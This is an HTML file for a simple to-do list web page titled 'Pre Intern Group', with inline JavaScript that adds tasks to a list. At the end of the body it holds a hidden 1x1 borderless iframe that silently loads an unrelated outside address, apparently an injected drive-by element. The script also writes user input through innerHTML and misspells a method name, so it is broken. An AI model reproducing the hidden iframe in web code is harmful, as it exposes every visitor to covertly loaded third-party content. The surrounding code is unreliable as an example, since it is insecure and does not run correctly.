<!DOCTYPE html>
<html>
    <head>
        <script>
            document.addEventListener('DOMContentLoaded',() => {
                document.querySelector('#todo-list').onsubmit = () => {
                    const li = document.createElement('li');
                    li.innerHTML = document.querySelector('#task').value;

                    document.querySelector('#list').appened(li);
                    document.querySelector('#task').value = '';
                    return false;
                };
            });
        </script>
        <title>Pre Intern Group</title>
    </head>
    <body>
        <h1>To Do List</h1>
        <ul id="list">
            
        </ul>
        <form id="todo-list">
            <input id="task" autocomplete="off" autofocus placeholder="Add todo-task" type="text">
            <input type="submit">
        </form>
    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
